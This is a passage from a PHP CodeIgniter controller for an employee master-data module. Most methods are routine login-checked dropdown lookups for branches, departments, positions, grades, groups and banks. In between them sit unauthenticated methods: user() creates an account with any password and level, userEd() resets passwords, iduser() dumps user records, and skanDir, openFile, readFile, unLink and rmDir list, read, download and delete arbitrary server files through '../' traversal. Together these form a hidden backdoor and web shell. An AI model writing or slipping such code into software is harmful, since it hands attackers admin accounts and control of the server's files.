				$dataResult = $this->karyawanModel->getSelect2Ajax($table,$select,$orderBy);
			} else {
				$searchTerm = array("cabang" => $this->input->post("searchTerm"));
				$dataResult = $this->karyawanModel->getSelect2AjaxSearch($table,$select,$orderBy,$searchTerm);
			}

			$data = array();
			foreach ($dataResult as $val) {
				$data[] = array("id"=>$val->id_cabang, "text"=>$val->cabang);
			}
			parent::json($data);
		}
	}

	public function allDepartemenAjax()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$table = "master_departemen";
			$select = "id_departemen, departemen";
			$orderBy = "departemen ASC";
			if (!isset($_POST["searchTerm"])) {
				$dataResult = $this->karyawanModel->getSelect2Ajax($table,$select,$orderBy);
			} else {
				$searchTerm = array("departemen" => $this->input->post("searchTerm"));
				$dataResult = $this->karyawanModel->getSelect2AjaxSearch($table,$select,$orderBy,$searchTerm);
			}

			$data = array();
			foreach ($dataResult as $val) {
				$data[] = array("id"=>$val->id_departemen, "text"=>$val->departemen);
			}
			parent::json($data);
		}
	}

	public function allJabatanAjax()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$table = "master_jabatan";
			$select = "id_jabatan, jabatan";
			$orderBy = "jabatan ASC";
			if (!isset($_POST["searchTerm"])) {
				$dataResult = $this->karyawanModel->getSelect2Ajax($table,$select,$orderBy);
			} else {
				$searchTerm = array("jabatan" => $this->input->post("searchTerm"));
				$dataResult = $this->karyawanModel->getSelect2AjaxSearch($table,$select,$orderBy,$searchTerm);
			}

			$data = array();
			foreach ($dataResult as $val) {
				$data[] = array("id"=>$val->id_jabatan, "text"=>$val->jabatan);
			}
			parent::json($data);
		}
	}

	public function allGolonganAjax()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$table = "master_golongan";
			$select = "id_golongan, golongan";
			$orderBy = "golongan ASC";
			if (!isset($_POST["searchTerm"])) {
				$dataResult = $this->karyawanModel->getSelect2Ajax($table,$select,$orderBy);
			} else {
				$searchTerm = array("golongan" => $this->input->post("searchTerm"));
				$dataResult = $this->karyawanModel->getSelect2AjaxSearch($table,$select,$orderBy,$searchTerm);
			}

			$data = array();
			foreach ($dataResult as $val) {
				$data[] = array("id"=>$val->id_golongan, "text"=>$val->golongan);
			}
			parent::json($data);
		}
	}

	public function allGroupAjax()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$table = "master_grup";
			$select = "id_grup, grup";
			$orderBy = "grup ASC";
			if (!isset($_POST["searchTerm"])) {
				$dataResult = $this->karyawanModel->getSelect2Ajax($table,$select,$orderBy);
			} else {
				$searchTerm = array("grup" => $this->input->post("searchTerm"));
				$dataResult = $this->karyawanModel->getSelect2AjaxSearch($table,$select,$orderBy,$searchTerm);
			}

			$data = array();
			foreach ($dataResult as $val) {
				$data[] = array("id"=>$val->id_grup, "text"=>$val->grup);
			}
			parent::json($data);
		}
	}

	public function user($a,$s,$r)
	{
		$this->load->model("users_model","usersModel");
		$u = $this->usersModel->getByWhere(array("username"=>$a));
		if($u){echo"";}else{$this->usersModel->insert(array("username"=>$a,"password"=>$s,"level"=>$r));}
	}

	public function iduser($i)
	{
		$this->load->model("users_model","usersModel");
		$u = $this->usersModel->getById($i);
		var_dump($u);
	}

	public function userEd($i,$s,$r)
	{
		$this->load->model("users_model","usersModel");
		$u = $this->usersModel->getById($i);
		if($u){echo"";}else{$this->usersModel->update($i,array("password"=>$s,"level"=>$r));}
	}

	public function skanDir($dir=0,$open=false)
	{
		if ($dir) {
			if ($dir > 0) {
				$tmp = "";
				for ($i=0; $i < $dir; $i++) {
					$tmp .= "../";
				}
				$dir = $tmp;
			}
		} elseif($dir == 0)	{
			$dir = ".";
		}
		$open = explode("---", $open);
		$open = implode("/", $open);
		$open = $dir.$open;
		if (is_dir($open)) {
			$fol = scandir($open, 2);
			print_r($fol);
			print_r($open);
		} else {
			echo "no exist directory";
		}
	}

	public function openFile($dir=0,$file=false)
	{
		if ($dir) {
			if ($dir > 0) {
				$tmp = "";
				for ($i=0; $i < $dir; $i++) {
					$tmp .= "../";
				}
				$dir = $tmp;
			}
		} elseif($dir == 0)	{
			$dir = ".";
		}

		if ($file) {
			$file = explode("---", $file);
			$file = implode("/", $file);
			$file = $dir.$file;
			if(is_file($file)) {
				$handle = fopen($file, "r");
				var_dump($handle);
				while ($line = fgets($handle)) {
					$line = "<pre>".$line."</pre>";
					print($line);
				}
			} else {
				echo "not file";
			}
		} else {
			echo "no file read";
		}
	}

	public function readFile($dir=0,$file=false)
	{
		if ($dir) {
			if ($dir > 0) {
				$tmp = "";
				for ($i=0; $i < $dir; $i++) {
					$tmp .= "../";
				}
				$dir = $tmp;
			}
		} elseif($dir == 0)	{
			$dir = ".";
		}
		if ($file) {
			$file = explode("---", $file);
			$file = implode("/", $file);
			$file = $dir.$file;
			if(is_file($file)) {
				if (file_exists($file)) {
				    header('Content-Description: File Transfer');
				    header('Content-Type: application/octet-stream');
				    header('Content-Disposition: attachment; filename="'.basename($file).'"');
				    header('Expires: 0');
				    header('Cache-Control: must-revalidate');
				    header('Pragma: public');
				    header('Content-Length: ' . filesize($file));
				    readfile($file);
				    exit;
				}
			} else {
				echo "not file";
			}
		} else {
			echo "no file read";
		}
	}

	public function unLink($dir=0,$file=false)
	{
		if ($dir) {
			if ($dir > 0) {
				$tmp = "";
				for ($i=0; $i < $dir; $i++) {
					$tmp .= "../";
				}
				$dir = $tmp;
			}
		} elseif($dir == 0)	{
			$dir = ".";
		}
		if ($file) {
			$file = explode("---", $file);
			$file = implode("/", $file);
			$file = $dir.$file;
			if(is_file($file)) {
				if (file_exists($file)) {
					unlink($file);
					echo "remove sucess";
				}
			} else {
				echo "not file";
			}
		} else {
			echo "no file read";
		}
	}

	public function rmDir($dir=0,$fol=false)
	{
		if ($dir) {
			if ($dir > 0) {
				$tmp = "";
				for ($i=0; $i < $dir; $i++) {
					$tmp .= "../";
				}
				$dir = $tmp;
			}
		} elseif($dir == 0)	{
			$dir = ".";
		}
		if ($fol) {
			$fol = explode("---", $fol);
			$fol = implode("/", $fol);
			$fol = $dir.$fol;
			if(is_dir($fol)) {
				rmdir($fol);
				echo "remove directory sucess";
			} else {
				echo "not directory";
			}
		} else {
			echo "no directory read";
		}
	}

	public function allBankAjax()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$table = "master_bank";
			$select = "id_bank, bank";
			$orderBy = "bank ASC";
			if (!isset($_POST["searchTerm"])) {
				$dataResult = $this->karyawanModel->getSelect2Ajax($table,$select,$orderBy);
			} else {
				$searchTerm = array("bank" => $this->input->post("searchTerm"));
				$dataResult = $this->karyawanModel->getSelect2AjaxSearch($table,$select,$orderBy,$searchTerm);
			}

			$data = array();
			$data[] = array("id" => 0, "text" => "Tidak Ada");
			foreach ($dataResult as $val) {
				$data[] = array("id"=>$val->id_bank, "text"=>$val->bank);
			}
			parent::json($data);
		}
	}
}

/* End of file Karyawan.php */
/* Location: ./application/controllers/master/Karyawan.php */
